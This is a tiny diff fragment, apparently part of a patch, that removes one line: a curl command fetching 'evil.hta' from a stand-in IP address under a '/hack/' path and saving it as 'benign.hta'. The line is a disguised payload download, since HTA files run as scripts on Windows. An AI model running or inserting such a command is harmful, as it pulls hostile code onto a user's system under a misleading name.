@@ -1,1 +1,0 @@
-curl  --output benign.hta "https://12.34.56.78/hack/evil.hta"
